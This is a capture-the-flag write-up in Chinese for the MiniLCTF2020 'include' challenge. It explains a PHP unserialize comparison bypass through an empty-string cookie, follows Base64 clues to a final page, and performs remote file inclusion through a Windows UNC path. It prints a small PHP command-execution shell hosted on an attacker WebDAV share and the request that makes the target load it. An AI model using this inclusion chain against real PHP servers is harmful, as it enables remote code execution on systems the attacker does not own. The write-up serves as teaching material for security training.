# MiniLCTF2020 - include

## 题目简述

题目由空值反序列化比较、Base64 跳转线索和 Windows 环境远程文件包含三步组成。最终 `f1na1.php` 禁止 `../`、`tp`、`input`、`data`，但仍允许 UNC 路径，因此可以让目标通过 SMB/WebDAV 读取攻击者控制的脚本。

## 解题过程

入口先读取 Cookie：

```php
$id = $_COOKIE['ID'];
if (unserialize($id) === "$admin") {
    include('next.php');
    if (preg_match('/p@d/is', $_REQUEST['key'])) {
        show_source('next.php');
    }
}
$admin = 'm0ectf';
```

赋值语句位于判断之后，因此比较发生时 `$admin` 尚未定义，字符串上下文中等价于空串。Cookie 使用空字符串的序列化结果：

```text
ID=s:0:"";
```

再提交能匹配 `p@d` 的 `key`，源码会泄露：

```php
$flag = array('Oops'=>'!', 'LOOKHERE'=>'TE9PS0hFUkU=.html');
```

访问该 HTML 并在重定向前读取响应，可见注释 `T2glMjFHbyUyMCUyMGYxbmExLnBocA==`。连续做 Base64 与 URL 解码后得到 `Oh!21Go  f1na1.php`，指向最终文件包含入口。

最终过滤器会命中 `http` 中的 `tp`，也禁用了常见 `php://input` 和 `data://`。目标是 Windows/IIS 环境，UNC 路径 `//服务器/webdav/a.txt` 会触发 SMB/WebDAV 访问；在可控 WebDAV 目录放入：

```php
<?php system('dir'); ?>
```

请求：

```text
/f1na1.php?file=//ATTACKER/webdav/a.txt
```

列目录后再读取名称为长 Base64 串的文本文件，即可得到实例 flag。这里的外部 WebDAV 不是一个可省略的“工具链接”，而是利用链中的远程包含载体。

## 方法总结

PHP 文件包含题要先确认操作系统和路径语义。过滤 Web 协议不代表阻断 UNC：Windows 会把 `//host/share/file` 解释为网络资源。还要注意变量赋值的执行顺序；同一文件中的两个 PHP 代码块不会提前初始化后面的变量。
